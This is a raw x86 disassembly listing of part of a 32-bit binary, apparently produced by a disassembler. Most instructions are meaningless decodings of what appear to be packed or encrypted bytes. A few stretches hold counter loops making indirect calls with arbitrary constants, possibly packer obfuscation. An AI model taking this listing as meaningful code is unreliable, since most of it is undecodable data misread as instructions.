  40a0e1:	xor    eax,0x8fa014ad
  40a0e6:	call   0x950e8a40
  40a0eb:	mov    ah,0x90
  40a0ed:	inc    ebp
  40a0ee:	test   al,0xb2
  40a0f0:	stc    
  40a0f1:	mov    al,ds:0x5c806d96
  40a0f6:	add    dl,dh
  40a0f8:	cs int3 
  40a0fa:	mov    al,ds:0x23b41879
  40a0ff:	fld    QWORD PTR ds:0x4da3530
  40a105:	jp     0x40a087
  40a107:	aaa    
  40a108:	loope  0x40a14a
  40a10a:	or     esp,esi
  40a10c:	jbe    0x40a141
  40a10e:	adc    ecx,esi
  40a110:	xchg   ebp,eax
  40a111:	or     BYTE PTR [ecx+0x170ec3fb],ah
  40a117:	call   0xaf4f1efa
  40a11c:	mov    edi,0x5965cb4a
  40a121:	inc    esi
  40a122:	and    edi,ebp
  40a124:	xchg   ebp,eax
  40a125:	jg     0x40a186
  40a127:	in     eax,dx
  40a128:	mov    DWORD PTR [edx],ebp
  40a12a:	and    esp,ecx
  40a12c:	shl    DWORD PTR [edi-0x2],1
  40a12f:	jne    0x40a17d
  40a131:	stc    
  40a132:	shl    BYTE PTR [edi-0x3c],1
  40a135:	daa    
  40a136:	sub    DWORD PTR [ebx+0x36],0x9c7147a5
  40a13d:	outs   dx,DWORD PTR ds:[esi]
  40a13e:	fxch   st(2)
  40a140:	pop    ds
  40a141:	or     BYTE PTR [edx],dl
  40a143:	es mov ecx,0x7619eb65
  40a149:	cli    
  40a14a:	cmp    ch,BYTE PTR [ebp+0x2f009777]
  40a150:	(bad)  
  40a151:	push   ebx
  40a152:	mov    ch,0x2c
  40a154:	sti    
  40a155:	sbb    al,0xa1
  40a157:	int3   
  40a158:	push   esi
  40a159:	test   DWORD PTR [ebx],ebx
  40a15b:	dec    eax
  40a15c:	push   DWORD PTR [esi]
  40a15e:	mov    edi,0x7844f9f8
  40a163:	add    DWORD PTR [ebp+eiz*1-0x7abbee52],0x31
  40a16b:	test   ch,0xd5
  40a16e:	pop    ebx
  40a16f:	test   al,0x18
  40a171:	mov    esp,0xcd4267e4
  40a176:	add    DWORD PTR [esi+0x650e9f69],esi
  40a17c:	repnz (bad) 
  40a17e:	push   DWORD PTR [ebp-0x4b]
  40a181:	in     eax,0x98
  40a183:	test   al,0x5b
  40a185:	jns    0x40a1ab
  40a187:	cmc    
  40a188:	lea    eax,[eax-0x31206bb8]
  40a18e:	sub    DWORD PTR [ebx],eax
  40a190:	dec    esi
  40a191:	int3   
  40a192:	test   al,0x3c
  40a194:	mov    esi,0xf1d2c2dc
  40a199:	test   al,0x21
  40a19b:	xchg   esi,eax
  40a19c:	sbb    edi,DWORD PTR [esi+0x2be511db]
  40a1a2:	arpl   WORD PTR [ecx],bx
  40a1a4:	push   0x981258f
  40a1a9:	mov    eax,ds:0xaad4b7ff
  40a1ae:	scas   eax,DWORD PTR es:[edi]
  40a1af:	mov    al,ds:0x1bd9fdcb
  40a1b4:	cmp    al,0x83
  40a1b6:	sub    edx,ebp
  40a1b8:	rcl    BYTE PTR [edx+0x6],1
  40a1bb:	mov    ch,0xae
  40a1bd:	adc    al,0xc4
  40a1bf:	daa    
  40a1c0:	cli    
  40a1c1:	jnp    0x40a1a6
  40a1c3:	jp     0x40a239
  40a1c5:	test   ecx,ebp
  40a1c7:	popf   
  40a1c8:	adc    BYTE PTR [ecx],al
  40a1ca:	in     eax,0xc1
  40a1cc:	inc    ecx
  40a1cd:	loope  0x40a16f
  40a1cf:	sub    esi,eax
  40a1d1:	(bad)  
  40a1d2:	jnp    0x40a19c
  40a1d4:	in     al,dx
  40a1d5:	imul   ebx,DWORD PTR [esi],0x34765c4c
  40a1db:	sub    eax,0xb0e32e11
  40a1e0:	xchg   edi,eax
  40a1e1:	mov    ebp,DWORD PTR [esp+edi*4]
  40a1e4:	neg    BYTE PTR [ebx+edi*2+0x29]
  40a1e8:	or     al,0xf1
  40a1ea:	rcr    DWORD PTR ds:0x84d23e7e,0x32
  40a1f1:	add    al,0xf1
  40a1f3:	sub    edi,DWORD PTR [edx+0x1ab300c1]
  40a1f9:	mov    edx,0x434869ac
  40a1fe:	ds icebp 
  40a200:	imul   ebp,DWORD PTR ds:[ebx+0x6bf58fe4],0x7bbb596c
  40a20b:	dec    edx
  40a20c:	cli    
  40a20d:	fnstcw WORD PTR [ebx+0x75]
  40a210:	or     BYTE PTR [esi+0x8],bh
  40a213:	cmc    
  40a214:	sbb    al,0x68
  40a216:	into   
  40a217:	in     al,dx
  40a218:	jge    0x40a265
  40a21a:	int3   
  40a21b:	adc    BYTE PTR [edx+ebx*8+0x77fe257b],dh
  40a222:	sbb    edx,esp
  40a224:	mov    bh,0xc0
  40a226:	mov    ecx,0xd6673274
  40a22b:	push   0xfffffffa
  40a22d:	pop    ss
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fded,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fded
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fded,edx
  40a263:	cmp    DWORD PTR ds:0x42fded,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fded,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e3e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e228,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e80f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	int    0x62
  40a2c6:	std    
  40a2c7:	inc    bp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2be
  40a2d1:	xchg   esi,eax
  40a2d2:	fsub   DWORD PTR [edx+0x2a]
  40a2d5:	repnz dec ebp
  40a2d7:	pop    es
  40a2d8:	fimul  DWORD PTR [edx-0x2c15c2dc]
  40a2de:	ret    0x1e63
  40a2e1:	xchg   esp,eax
  40a2e2:	data16 (bad) 
  40a2e4:	mov    ds:0xbb712232,eax
  40a2e9:	or     DWORD PTR [ecx+0x34],0x8f9c7d3c
  40a2f0:	sbb    ebp,esi
  40a2f2:	xor    BYTE PTR [esp+ecx*4+0x5ae79f64],0xd6
  40a2fa:	inc    eax
  40a2fb:	cld    
  40a2fc:	or     DWORD PTR [edx],0x9
  40a2ff:	jo     0x40a2b4
  40a301:	mov    ebp,DWORD PTR [esi+0x22a1dd81]
  40a307:	das    
  40a308:	bound  ecx,QWORD PTR [edx-0x77d03d00]
  40a30e:	cdq    
  40a30f:	jnp    0x40a33f
  40a311:	out    0xe1,eax
  40a313:	or     DWORD PTR [ebx],edi
  40a315:	out    dx,eax
  40a316:	pop    ds
  40a317:	or     eax,0x3403812f
  40a31c:	ret    
  40a31d:	push   ebx
  40a31e:	ret    0x8916
  40a321:	pop    ds
  40a322:	popa   
  40a323:	jl     0x40a2d3
  40a325:	push   ebx
  40a326:	aaa    
  40a327:	inc    ebx
  40a328:	daa    
  40a329:	pushf  
  40a32a:	shl    eax,cl
  40a32c:	(bad)  
  40a32d:	pop    ebx
  40a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a32f:	ins    DWORD PTR es:[edi],dx
  40a330:	xchg   BYTE PTR [edx],ah
  40a332:	sub    esi,ebp
  40a334:	pop    esp
  40a335:	xor    DWORD PTR [edi+0x7b],0x53
  40a339:	outs   dx,BYTE PTR ds:[esi]
  40a33a:	dec    ecx
  40a33b:	data16 jb 0x40a2df
  40a33e:	lahf   
  40a33f:	stos   BYTE PTR es:[edi],al
  40a340:	mov    DWORD PTR [ebx+edi*2],esp
  40a343:	mov    ecx,0x4ab3c5f3
  40a348:	fst    QWORD PTR [edx+eax*8]
  40a34b:	jnp    0x40a37e
  40a34d:	stos   DWORD PTR es:[edi],eax
  40a34e:	push   cs
  40a34f:	stc    
  40a350:	sbb    ecx,DWORD PTR [edx-0x2296c8cb]
  40a356:	pop    ss
  40a357:	out    dx,eax
  40a358:	sar    DWORD PTR [edx-0x49],1
  40a35b:	ret    0xc3ca
  40a35e:	sbb    eax,0x2ab47a62
  40a363:	jmp    0x7368:0xc482d098
  40a36a:	std    
  40a36b:	push   esi
  40a36c:	cmp    DWORD PTR [ebx-0x55],esi
  40a36f:	jmp    0xea04:0x1a28ad94
  40a376:	pop    eax
  40a377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a378:	or     DWORD PTR [edx+0x4c],eax
  40a37b:	mov    al,ds:0x82085e86
  40a380:	cli    
  40a381:	outs   dx,DWORD PTR ds:[esi]
  40a382:	sub    BYTE PTR [ebx-0x6a],ah
  40a385:	outs   dx,BYTE PTR ds:[esi]
  40a386:	cmc    
  40a387:	push   edi
  40a388:	jmp    0x3922:0x405e6ea9
  40a38f:	push   ebx
  40a390:	push   ss
  40a391:	fs cwde 
  40a393:	or     al,0x15
  40a395:	pop    ecx
  40a396:	sbb    eax,0x23b57d56
  40a39b:	call   DWORD PTR [ebx-0x3e39b177]
  40a3a1:	push   0x15
  40a3a3:	dec    ebx
  40a3a4:	mov    eax,ds:0xe1eed9c6
  40a3a9:	dec    esp
  40a3aa:	pop    edx
  40a3ab:	cdq    
  40a3ac:	mov    esi,0x9180d5dc
  40a3b1:	push   ecx
  40a3b2:	dec    edx
  40a3b3:	(bad)  
  40a3b4:	fld    TBYTE PTR [ecx-0x70722a7e]
  40a3ba:	scas   eax,DWORD PTR es:[edi]
  40a3bb:	stos   DWORD PTR es:[edi],eax
  40a3bc:	mov    al,ds:0x178c1973
  40a3c1:	add    eax,0x71d8dd14
  40a3c6:	retf   
  40a3c7:	scas   eax,DWORD PTR es:[edi]
  40a3c8:	sub    ch,ah
  40a3ca:	repz jmp FWORD PTR [ebp-0x32]
  40a3ce:	fstp   DWORD PTR [edi+edi*2]
  40a3d1:	or     ebp,ecx
  40a3d3:	jle    0x40a405
  40a3d5:	cld    
  40a3d6:	jmp    0xc2981e1a
  40a3db:	pop    ebx
  40a3dc:	repnz push ss
  40a3de:	xor    esp,DWORD PTR ss:[edi+0x71f0f89c]
  40a3e5:	retf   0x2ca5
  40a3e8:	pop    esi
  40a3e9:	fs in  eax,0x83
  40a3ec:	ja     0x40a3c2
  40a3ee:	out    0x9c,eax
  40a3f0:	xlat   BYTE PTR ds:[ebx]
  40a3f1:	sbb    eax,0xa26574da
  40a3f6:	push   esp
  40a3f7:	adc    ah,0x5c
  40a3fa:	cli    
  40a3fb:	rcr    BYTE PTR [ebx-0x41],cl
  40a3fe:	push   ebp
  40a3ff:	jbe    0x40a412
  40a401:	adc    DWORD PTR [ecx-0x55dc819a],esi
  40a407:	(bad)  
  40a408:	rol    WORD PTR [ecx-0x7f4388fe],0x8a
  40a410:	inc    edx
  40a411:	ja     0x40a40d
  40a413:	mov    BYTE PTR [ecx+0x73839522],al
  40a419:	mov    cl,0xec
  40a41b:	mov    ds:0x20f260e8,eax
  40a420:	retf   
  40a421:	int    0xa0
  40a423:	mov    eax,0x1b0cb6de
  40a428:	and    DWORD PTR [eax-0x43],ecx
  40a42b:	mov    edi,DWORD PTR [eax-0x26b7a926]
  40a431:	inc    ecx
  40a432:	bound  ecx,QWORD PTR [ebx+0x16]
  40a435:	jl     0x40a43d
  40a437:	rol    BYTE PTR [ebx-0x7e],cl
  40a43a:	adc    ecx,DWORD PTR [ebp-0x66]
  40a43d:	mov    al,ds:0x98ee4bb8
  40a442:	(bad)  
  40a443:	ds xchg edx,eax
  40a445:	in     al,0x4a
  40a447:	mov    ebp,0x4e4f9668
  40a44c:	shr    BYTE PTR [eax-0x3824aa92],0x73
  40a453:	ficom  DWORD PTR [esi+0xb]
  40a456:	xor    BYTE PTR [esi+0x5],bl
  40a459:	jne    0x40a444
  40a45b:	mov    fs,WORD PTR [ebx-0x5b69a543]
  40a461:	arpl   ax,ax
  40a463:	and    al,0xda
  40a465:	popf   
  40a466:	stos   BYTE PTR es:[edi],al
  40a467:	scas   al,BYTE PTR es:[edi]
  40a468:	fwait
  40a469:	enter  0xafcc,0x71
  40a46d:	mov    BYTE PTR [eax+eiz*1],bl
  40a470:	mov    al,ds:0xd2f68a16
  40a475:	xchg   ecx,eax
  40a476:	mov    ebx,0x3a816c87
  40a47b:	lods   al,BYTE PTR ds:[esi]
  40a47c:	das    
  40a47d:	pop    eax
  40a47e:	add    eax,0x75a28e26
  40a483:	in     al,dx
  40a484:	popf   
  40a485:	test   BYTE PTR [ecx+ebx*1+0x27],bl
  40a489:	lods   al,BYTE PTR ds:[esi]
  40a48a:	sbb    ebp,ebp
  40a48c:	xchg   edi,eax
  40a48d:	arpl   WORD PTR [esi],cx
  40a48f:	push   edi
  40a490:	mov    al,ds:0x94f48e7a
  40a495:	jb     0x40a509
  40a497:	xchg   bl,cl
  40a499:	xchg   esi,eax
  40a49a:	cmp    ah,ah
  40a49c:	xchg   esi,eax
  40a49d:	fnstsw WORD PTR ds:0xbdb6445d
  40a4a3:	sti    
  40a4a4:	test   DWORD PTR [edx-0x1784fed2],ecx
  40a4aa:	xor    bh,ah
  40a4ac:	popf   
  40a4ad:	jmp    0xfe9d:0x327458fe
  40a4b4:	test   al,0x3
  40a4b6:	mov    edx,0x59914b29
  40a4bb:	stos   DWORD PTR es:[edi],eax
  40a4bc:	pop    edi
  40a4bd:	(bad)  
  40a4bf:	fcomp  QWORD PTR [ecx+eax*4+0x1b]
  40a4c3:	frstor [eax+0x1da6f48a]
  40a4c9:	inc    esi
  40a4ca:	repz out 0xb5,eax
  40a4cd:	push   ecx
  40a4ce:	sub    eax,DWORD PTR [ebx]
  40a4d0:	xor    DWORD PTR [edx-0xb91e711],esi
  40a4d6:	sar    DWORD PTR [eax],0x24
  40a4d9:	pop    es
  40a4da:	jbe    0x40a4da
  40a4dc:	ss push ax
  40a4df:	sbb    dh,ch
  40a4e1:	xchg   ecx,eax
  40a4e2:	test   BYTE PTR cs:[ecx+0x5],0x8f
  40a4e7:	ds out dx,eax
  40a4e9:	in     al,0x37
  40a4eb:	fiadd  WORD PTR [edi]
  40a4ed:	push   edi
  40a4ee:	fwait
  40a4ef:	sub    edi,DWORD PTR [esi]
  40a4f1:	inc    ecx
  40a4f2:	sbb    edi,ebp
  40a4f4:	cmp    BYTE PTR [eax-0xe943c4d],dh
  40a4fa:	aad    0x77
  40a4fc:	fldcw  WORD PTR [esi]
  40a4fe:	sbb    al,0xb1
  40a500:	cs push ss
  40a502:	jbe    0x40a4bc
  40a504:	jnp    0x40a533
  40a506:	sti    
  40a507:	and    al,0x23
  40a509:	call   edx
  40a50b:	in     eax,dx
  40a50c:	jle    0x40a535
  40a50e:	mov    eax,0xde24a851
  40a513:	mov    edi,0x2032d354
  40a518:	mov    ecx,0x410c7a72
  40a51d:	pop    ebp
  40a51e:	jl     0x40a4dd
  40a520:	ja     0x40a508
  40a522:	cli    
  40a523:	sahf   
  40a524:	and    al,0x93
  40a526:	mov    ah,0x56
  40a528:	add    BYTE PTR ds:[edx+0x1b61a6d],0x55
  40a530:	xchg   esp,eax
  40a531:	pusha  
  40a532:	mov    esi,0x96d2d0e7
  40a537:	mov    edi,0xec726264
  40a53c:	or     al,bl
  40a53e:	nop
  40a53f:	(bad)  
  40a540:	ins    DWORD PTR es:[edi],dx
  40a541:	dec    ebx
  40a542:	call   0x4d71:0x67dfc3ee
  40a549:	fist   DWORD PTR [edx+ebx*1-0x44]
  40a54d:	mov    ds:0x56b765e5,al
  40a552:	outs   dx,BYTE PTR ds:[esi]
  40a553:	call   0xb355:0x742f8566
  40a55a:	inc    ebx
  40a55b:	sbb    BYTE PTR [edi-0x1c],dh
  40a55e:	xchg   ebx,eax
  40a55f:	xchg   DWORD PTR ds:0x8408be93,esi
  40a565:	push   cs
  40a566:	sub    al,0x5d
  40a568:	sub    edi,DWORD PTR [eax+0x680c8b99]
  40a56e:	cld    
  40a56f:	ficomp DWORD PTR [ebp-0x5b8356ed]
  40a575:	push   edx
  40a576:	sahf   
  40a577:	scas   eax,DWORD PTR es:[edi]
  40a578:	jns    0x40a564
  40a57a:	lock bound esi,QWORD PTR [edi-0x61ae0e2e]
  40a581:	icebp  
  40a582:	mov    dh,0x33
  40a584:	push   ebp
  40a585:	jge    0x40a5d7
  40a587:	call   FWORD PTR [edx]
  40a589:	das    
  40a58a:	xchg   edx,eax
  40a58b:	call   0x357e:0x9397d6b8
  40a592:	pop    ecx
  40a593:	fisubr DWORD PTR [edx]
  40a595:	sbb    esp,DWORD PTR ds:0x52f011da
  40a59b:	sbb    BYTE PTR [edi],ah
  40a59d:	cmp    eax,0xfa2b07ae
  40a5a2:	js     0x40a5c3
  40a5a4:	std    
  40a5a5:	scas   eax,DWORD PTR es:[edi]
  40a5a6:	sbb    BYTE PTR [ebx+0x63f33d03],al
  40a5ac:	in     eax,dx
  40a5ad:	pop    ds
  40a5ae:	adc    ecx,DWORD PTR [ecx+0x28695a64]
  40a5b4:	fisttp WORD PTR [ecx]
  40a5b6:	daa    
  40a5b7:	sbb    DWORD PTR [ebx+0x2aac0623],edi
  40a5bd:	lock and BYTE PTR es:[edx],ah
  40a5c1:	ror    DWORD PTR [esi-0x1e],1
  40a5c4:	rcl    DWORD PTR [ebx],0x6c
  40a5c7:	ins    BYTE PTR es:[edi],dx
  40a5c8:	retf   
  40a5c9:	fs ror eax,1
  40a5cc:	and    dh,BYTE PTR [edx+0x2e44d480]
  40a5d2:	repz mov cl,0x92
  40a5d5:	pop    ecx
  40a5d6:	arpl   sp,ax
  40a5d8:	jbe    0x40a658
  40a5da:	sub    esp,esp
  40a5dc:	pop    esi
  40a5dd:	(bad)
  40a5e0:	loopne 0x40a593
  40a5e2:	dec    esp
  40a5e3:	sub    al,0x34
  40a5e5:	sti    
  40a5e6:	mov    ds:0xb9ee7594,eax
  40a5eb:	xlat   BYTE PTR ds:[ebx]
  40a5ec:	out    0x3,al
  40a5ee:	cmp    al,0x8c
  40a5f0:	out    0xbc,eax
  40a5f2:	jo     0x40a648
  40a5f4:	pop    ds
  40a5f5:	mov    ?,WORD PTR [edx]
  40a5f7:	and    al,0x4b
  40a5f9:	ss inc esp
  40a5fb:	mov    edx,0xd6803d06
  40a600:	sbb    DWORD PTR [ecx],0xffffffa2
  40a603:	add    al,0xc2
  40a605:	push   esp
  40a606:	arpl   WORD PTR [edi],di
  40a608:	xchg   esi,eax
  40a609:	and    al,0x85
  40a60b:	leave  
  40a60c:	and    DWORD PTR [ecx-0x5c],0xe372cb9b
  40a613:	stc    
  40a614:	lds    ebx,FWORD PTR [eax+0x5f]
  40a617:	and    BYTE PTR [ecx+0x4d],bl
  40a61a:	pop    ecx
  40a61b:	xchg   ecx,eax
  40a61c:	xchg   edi,eax
  40a61d:	pop    es
  40a61e:	inc    edx
  40a61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a620:	in     eax,0x8f
  40a622:	xor    eax,0xcbf54e03
  40a627:	dec    edx
  40a628:	test   eax,0x17981d
  40a62d:	test   BYTE PTR [edx+0x1d075feb],cl
  40a633:	jmp    0x84320816
  40a638:	cmp    DWORD PTR [eax-0x353144d1],esp
  40a63e:	inc    esi
  40a63f:	mov    WORD PTR [edi-0x4557d4df],cs
  40a645:	xchg   ecx,eax
  40a646:	mov    bh,BYTE PTR [eax-0x1ab8914f]
  40a64c:	mov    al,ds:0xaa136f83
  40a651:	adc    al,0xd2
  40a653:	or     BYTE PTR [ebx],al
  40a655:	and    BYTE PTR [edx+0x641aa6f4],ch
  40a65b:	das    
  40a65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a65d:	out    0x91,al
  40a65f:	pusha  
  40a660:	lock loop 0x40a5f7
  40a663:	or     edi,DWORD PTR [ecx]
  40a665:	xor    BYTE PTR [edi+0x22],0x8b
  40a669:	jge    0x40a682
  40a66b:	push   0xffffffe7
  40a66d:	inc    edx
  40a66e:	ins    BYTE PTR es:[edi],dx
  40a66f:	cmp    eax,0xcc45c7c2
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e7ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e7ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e7ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e7ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e7f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e3eb
  40a6c6:	cmp    DWORD PTR ds:0x42e7ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e7ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e7ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e7ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fddd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fddd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fddd,edx
  40a709:	cmp    DWORD PTR ds:0x42fddd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fddd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e36d
  40a728:	push   0x42e35b
  40a72d:	call   DWORD PTR ds:0x42e647
  40a733:	cmp    DWORD PTR ds:0x42fddd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fddd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fddd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e234
  40a75a:	xor    edi,DWORD PTR ds:0x42e813
  40a760:	mov    DWORD PTR ds:0x42e234,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e813,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fdd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fde5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e813,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fdf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fe09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e230,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e230,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e230,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e2e7
  40a7e8:	push   0x42e33d
  40a7ed:	push   0x42e33d
  40a7f2:	call   DWORD PTR ds:0x42e3ef
  40a7f8:	cmp    DWORD PTR ds:0x42e230,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e230
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e230,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e230
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e230,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e22c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fe6e
  40a839:	add    DWORD PTR ds:0x42e807,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	lds    eax,FWORD PTR [edx-0xe1bb6d8]
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a8bd
  40a860:	ds pop es
  40a862:	and    eax,DWORD PTR ds:0x3198f0b3
  40a868:	lods   al,BYTE PTR ds:[esi]
  40a869:	xchg   DWORD PTR [ebx+0x4d],edi
  40a86c:	mov    esp,DWORD PTR [edx-0x6b1103f7]
  40a872:	mov    ?,WORD PTR [eax+0x2b]
  40a875:	sbb    al,0x1f
  40a877:	cli    
  40a878:	fucomip st,st(3)
  40a87a:	pop    es
  40a87b:	add    BYTE PTR [eax],al
  40a87d:	loop   0x40a818
  40a87f:	ret    0x45a5
  40a882:	ret    0x1d5f
  40a885:	test   DWORD PTR [esi-0x1a577b7f],0xb04422a2
  40a88f:	push   0x56
  40a891:	mov    ch,0xc3
  40a893:	push   ecx
  40a894:	adc    eax,ebp
  40a896:	mov    BYTE PTR [eax],al
  40a898:	es xchg ecx,eax
  40a89a:	adc    DWORD PTR [ebx],eax
  40a89c:	mov    ds:0xff254de7,al
  40a8a1:	cmc    
  40a8a2:	inc    edx
  40a8a3:	cli    
  40a8a4:	xor    dl,BYTE PTR [esi]
  40a8a6:	sar    DWORD PTR [ebx-0x5d],cl
  40a8a9:	sbb    eax,0xb6096020
  40a8ae:	out    dx,eax
  40a8af:	pop    edx
  40a8b0:	xchg   ecx,eax
  40a8b1:	inc    ebp
  40a8b2:	js     0x40a8e9
  40a8b4:	mov    al,ds:0xd21ea168
  40a8b9:	mov    DWORD PTR [eax-0x50],edx
  40a8bc:	push   0x63
  40a8be:	adc    BYTE PTR [ebp+0x0],dh
  40a8c1:	sbb    bl,ch
  40a8c3:	repz in al,dx
  40a8c5:	xchg   ecx,eax
  40a8c6:	scas   al,BYTE PTR es:[edi]
  40a8c7:	push   ss
  40a8c8:	add    BYTE PTR [ecx+eax*1-0x362a2536],0x76
  40a8d0:	mov    BYTE PTR [ebx-0x62],cl
  40a8d3:	gs pushf 
  40a8d5:	add    ch,BYTE PTR [ebp+eax*8+0x72]
  40a8d9:	test   DWORD PTR [edx-0x1f9770c4],esp
  40a8df:	mov    cl,0x73
  40a8e1:	leave  
  40a8e2:	add    al,0xa6
  40a8e4:	fadd   QWORD PTR [esi]
  40a8e6:	shr    DWORD PTR [ecx],cl
  40a8e8:	sub    edx,DWORD PTR [edi]
  40a8ea:	test   al,0xb7
  40a8ec:	push   esi
  40a8ed:	cmp    esi,DWORD PTR [eax]
  40a8ef:	sbb    BYTE PTR [ebp+0x38],al
  40a8f2:	aad    0x89
  40a8f4:	lea    ebx,[ebx-0x1996a18c]
  40a8fa:	(bad)  
  40a8fb:	(bad)  
  40a8fc:	daa    
  40a8fd:	pop    edx
  40a8fe:	push   cs
  40a8ff:	mov    esi,DWORD PTR [esi]
  40a901:	push   ds
  40a902:	mov    esi,0x3b9db0a0
  40a907:	jp     0x40a909
  40a909:	xchg   ecx,eax
  40a90a:	mov    al,ds:0xcd698f4c
  40a90f:	popf   
  40a910:	jmp    0x45af:0xeb095c85
  40a917:	shl    DWORD PTR [eax+0x46],cl
  40a91a:	outs   dx,BYTE PTR ds:[esi]
  40a91b:	adc    al,0x2f
  40a91d:	jp     0x40a983
  40a91f:	(bad)  
  40a920:	lahf   
  40a921:	jmp    0x40a957
  40a923:	mov    WORD PTR [ebx+0x3d962940],cs
  40a929:	aas    
  40a92a:	pop    esi
  40a92b:	stos   DWORD PTR es:[edi],eax
  40a92c:	sahf   
  40a92d:	mov    ch,0xfd
  40a92f:	and    ebx,DWORD PTR [esi]
  40a931:	std    
  40a932:	jle    0x40a978
  40a934:	and    DWORD PTR [bp+si],0x5b
  40a938:	mov    WORD PTR [esi-0x5f939df1],ss
  40a93e:	cmp    ah,BYTE PTR [esi-0x5e075534]
  40a944:	daa    
  40a945:	mov    ah,0x4a
  40a947:	push   ebx
  40a948:	out    0xdf,al
  40a94a:	inc    edx
  40a94b:	mov    cl,0x98
  40a94d:	mov    ecx,DWORD PTR [edi]
  40a94f:	pop    esi
  40a950:	imul   edi,DWORD PTR [ebp-0x4d],0xffffffb2
  40a954:	mov    ds:0x59e399d7,al
  40a959:	ret    0xe3ec
  40a95c:	mov    bl,0xf2
  40a95e:	(bad)  
  40a95f:	sub    al,0x97
  40a961:	mov    dh,0x8b
  40a963:	inc    ecx
  40a964:	into   
  40a965:	add    eax,0x45069016
  40a96a:	sbb    al,BYTE PTR [ebp+0x1f]
  40a96d:	fmul   QWORD PTR [edx+0x3e5c363c]
